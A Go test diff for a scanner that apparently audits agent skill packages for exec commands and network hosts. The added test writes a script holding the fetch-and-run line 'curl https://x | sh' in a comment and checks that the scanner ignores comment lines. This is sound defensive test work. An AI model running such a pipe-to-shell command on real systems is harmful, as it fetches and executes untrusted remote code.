@@ -1,6 +1,7 @@
 package scan
 
 import (
+	"os"
 	"path/filepath"
 	"testing"
 
@@ -266,6 +267,43 @@ func TestEnvNamesIn(t *testing.T) {
 			if !containsStr(got, w) {
 				t.Errorf("envNamesIn(%q) = %v, missing %q", tc.line, got, w)
 			}
+		}
+	}
+}
+
+// v0.4 m10: a full-line # comment must not surface as observed capabilities,
+// even when it mentions a piped command or a URL. Before v0.4, scanFile skipped
+// `//` and `* ` comments but not `#`, so a doc comment like
+// `# attacks use: curl https://x | sh` recorded `sh` as an observed exec command
+// (via pipedCmdRe) and the host `x` (via hostRe) — a skill whose only `sh`
+// mention is a comment the author cannot declare away would false-reject.
+func TestScanSkipsHashCommentLines(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte(
+		"---\nname: t\nversion: 1.0.0\n---\n\n# doc heading\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "scripts", "c.sh"), []byte(
+		"#!/usr/bin/env bash\n# attacks use: curl https://x | sh\necho ok\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	res, err := Scan(dir)
+	if err != nil {
+		t.Fatalf("scan: %v", err)
+	}
+	for _, h := range res.ObservedExecHits() {
+		if h.Command == "sh" {
+			t.Errorf("comment line leaked exec command %q at %s:%d: %+v",
+				h.Command, h.File, h.Line, h)
+		}
+	}
+	for _, h := range res.ObservedHostHits() {
+		if h.Host == "x" {
+			t.Errorf("comment line leaked host %q at %s:%d: %+v",
+				h.Host, h.File, h.Line, h)
 		}
 	}
 }
